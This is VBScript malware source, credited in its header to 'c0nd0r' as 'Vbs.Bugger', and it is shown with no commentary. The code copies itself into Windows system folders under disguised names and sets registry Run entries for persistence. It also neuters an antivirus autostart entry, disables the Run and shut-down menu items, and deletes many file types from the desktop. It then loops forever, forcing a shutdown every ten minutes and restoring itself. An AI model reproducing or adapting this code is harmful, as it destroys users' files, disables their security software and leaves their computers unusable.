'Vbs.Bugger Created By c0nd0r

On Error Resume Next
set FileSystemObject = CreateObject("Scripting.FileSystemObject")
Set WScriptShell = CreateObject("WScript.Shell")

Set dirwin = FileSystemObject.GetSpecialFolder(0)
Set dirsystem = FileSystemObject.GetSpecialFolder(1)
DesktopPath = WScriptShell.SpecialFolders("Desktop")

FileSystemObject.copyfile wscript.scriptfullname,dirwin & "\Kernel32.vbs"
FileSystemObject.copyfile wscript.scriptfullname,dirsystem & "\WinSock.vbs"

WScriptShell.regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\run\SystemRoot",dirwin&"\Kernel32.vbs"
WScriptShell.regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices\System32",dirwin&"\Kernel32.vbs"

WScriptShell.regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Version","VIRUS"
WScriptShell.regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\ProductName","VIRUS"
WScriptShell.regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\RegisteredOwned","VIRUS" 

WScriptShell.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\NAV Agent", ""
WScriptShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoRun","1"
WScriptShell.regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoClose","1"

FileSystemObject.DeleteFile(DesktopPath & "\*.lnk")
FileSystemObject.DeleteFile(DesktopPath & "\*.exe")
FileSystemObject.DeleteFile(DesktopPath & "\*.zip")
FileSystemObject.DeleteFile(DesktopPath & "\*.txt")
FileSystemObject.DeleteFile(DesktopPath & "\*.doc")
FileSystemObject.DeleteFile(DesktopPath & "\*.rar")
FileSystemObject.DeleteFile(DesktopPath & "\*.jpeg")
FileSystemObject.DeleteFile(DesktopPath & "\*.html")
FileSystemObject.DeleteFile(DesktopPath & "\*.mp3")
FileSystemObject.DeleteFile(DesktopPath & "\*.gif")
FileSystemObject.DeleteFile(DesktopPath & "\*.pif")
FileSystemObject.DeleteFile(DesktopPath & "\*.bmp")

do
 On Error Resume Next
 if minute(now) = 00 then 
 WScriptShell.run ("Rundll32.exe user,exitwindows")
 WScriptShell.run ("Rundll32.exe KRNL386.EXE,exitkernel")
 WScriptShell.run ("Shutdown.exe -s -t 01")
 end if
 if minute(now) = 10 then 
 WScriptShell.run ("Rundll32.exe user,exitwindows")
 WScriptShell.run ("Rundll32.exe KRNL386.EXE,exitkernel")
 WScriptShell.run ("Shutdown.exe -s -t 01")
 end if
 if minute(now) = 20 then 
 WScriptShell.run ("Rundll32.exe user,exitwindows")
 WScriptShell.run ("Rundll32.exe KRNL386.EXE,exitkernel")
 WScriptShell.run ("Shutdown.exe -s -t 01")
 end if 
 if minute(now) = 30 then 
 WScriptShell.run ("Rundll32.exe user,exitwindows")
 WScriptShell.run ("Rundll32.exe KRNL386.EXE,exitkernel")
 WScriptShell.run ("Shutdown.exe -s -t 01")
 end if
 if minute(now) = 40 then 
 WScriptShell.run ("Rundll32.exe user,exitwindows")
 WScriptShell.run ("Rundll32.exe KRNL386.EXE,exitkernel")
 WScriptShell.run ("Shutdown.exe -s -t 01")
 end if
 if minute(now) = 50 then 
 WScriptShell.run ("Rundll32.exe user,exitwindows")
 WScriptShell.run ("Rundll32.exe KRNL386.EXE,exitkernel")
 WScriptShell.run ("Shutdown.exe -s -t 01")
 end if

 Set WScriptShell = CreateObject("WScript.Shell")
 Set FileSystemObject = Createobject("scripting.filesystemobject")
 Set dirwin = FileSystemObject.GetSpecialFolder(0)
 If FileSystemObject.FileNotExists(dirwin&"\Kernel32.vbs") Then 
 Set c = FileSystemObject.GetFile(dirsystem&"\WinSock.vbs")
 c.Copy(dirwin&"\Kernel32.vbs")
 end if

 Set WScriptShell = CreateObject("WScript.Shell")
 Set FileSystemObject = Createobject("scripting.filesystemobject")
 Set dirwin = FileSystemObject.GetSpecialFolder(0)
 If FileSystemObject.FileNotExists(dirsystem&"\WinSock.vbs") Then 
 Set c = FileSystemObject.GetFile(dirwin&"\Kernel32.vbs")
 c.Copy(dirsystem&"\WinSock.vbs")
 end if

 WScriptShell.regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\run\SystemRoot",dirwin&"\Kernel32.vbs"
 WScriptShell.regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices\System32",dirwin&"\Kernel32.vbs"
loop
